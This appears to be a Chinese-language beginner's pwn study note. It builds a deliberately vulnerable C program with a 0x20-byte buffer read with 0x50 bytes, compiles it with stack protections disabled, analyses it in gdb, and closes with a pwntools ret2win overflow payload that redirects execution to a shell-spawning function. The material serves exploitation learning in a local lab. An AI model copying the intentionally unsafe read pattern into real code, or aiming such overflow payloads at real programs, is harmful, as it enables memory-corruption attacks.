# Test 学习

---

Pwn 第一个学习案例

---



### 源代码

由C语言编写，Ubuntu20.04 环境，使用 VScode 编写Test.c

```c
#include <stdio.h>

void exploit(){
    system("bin/sh");
}

void func(){
    char str[0x20];
    read(0,str,0x50);   #参数0表示从命令行读取
}

int main(){
    func();
    printf("Success");
    return 0;
}
```



### 编译

**Attention:**不要使用VScode编译，VScode对代码编译默认加上各种保护措施，使用checksec 检查后会得到下图：

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Test_2021-02-14_23-31-49.png)

由上图 可知，所有的保护措施都已开启，不便于实验学习。

因此**我们需要通过终端控制编译，使用命令 gcc -no-pie -fno-stack-protector -z execstack -m32 -o Test Test.c **，关闭保护措施，

得到下图：

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Test_2021-02-14_23-41-46.png)

### 程序分析

#### 	Objdump查看函数

一般的程序，我们得到的都是二进制代码，无源程序------

objdump命令是用查看目标文件或者可执行的目标文件的构成的gcc工具。详情https://man.linuxde.net/objdump

-j name

--section=name 仅仅显示指定名称为name的section的信息

-t

--syms 显示文件的符号表入口。类似于nm -s提供的信息

objdump -t -j .text read//查看read程序的.text段有哪些函数

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Test_2021-02-15_11-24-16.png)

#### GDB调试

1. 反汇编重点函数func 并分析其汇编代码

   ```assembly
   wndbg> disass func			;得到func函数的汇编代码
   Dump of assembler code for function func:
      0x08049205 <+0>:	endbr32 		;无任何操作,无意义。Intel用于表示跳转,给技术要求相对跳转的目标地址一定是一条 endbr32 或 endbr64 指令，否则就会异常。
      0x08049209 <+4>:	push   ebp
      0x0804920a <+5>:	mov    ebp,esp   ;这两句构建栈帧 ，与最后两句相对应  相当于enter
      0x0804920c <+7>:	push   ebx       ;保存寄存器
      0x0804920d <+8>:	sub    esp,0x24   ;留出栈空间
      0x08049210 <+11>:	call   0x8049279 <__x86.get_pc_thunk.ax>
      0x08049215 <+16>:	add    eax,0x2deb
      0x0804921a <+21>:	sub    esp,0x4
      0x0804921d <+24>:	push   0x50			;栈空间小于0x50
      0x0804921f <+26>:	lea    edx,[ebp-0x28]  ;注意填充地址不是从esp开始 而是[ebp-0x28]
      0x08049222 <+29>:	push   edx
      0x08049223 <+30>:	push   0x0
      0x08049225 <+32>:	mov    ebx,eax
      0x08049227 <+34>:	call   0x8049080 <read@plt>
      0x0804922c <+39>:	add    esp,0x10
      0x0804922f <+42>:	nop
      0x08049230 <+43>:	mov    ebx,DWORD PTR [ebp-0x4]  
      0x08049233 <+46>:	leave    ; mov esp;ebp , pop ebp   结束栈帧
      0x08049234 <+47>:	ret     ; 相当于jmp指令
   End of assembler dump.
   pwndbg> 
   
   ```

2. 反汇编 exploit  得到 该函数的起始地址 **0x080491d6**，堆栈图如下所示。**注意填充地址不是从esp开始 而是[ebp-0x28]**

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Test_2021-02-15_21-23-48.png)





### Payload

```python
from pwn import *    #导入库
p = process("./Example/Test")  #加载程序
offset = 0x28+0x4   #偏移量 --->注意填充地址不是从esp开始 而是[ebp-0x28]
payload =b'a'*offset + p32(0x080491da)  # python3 要加字母b表示二进制  填充信息
p.sendline(payload)   # -->输入信息
p.interactive()   # 交互
```

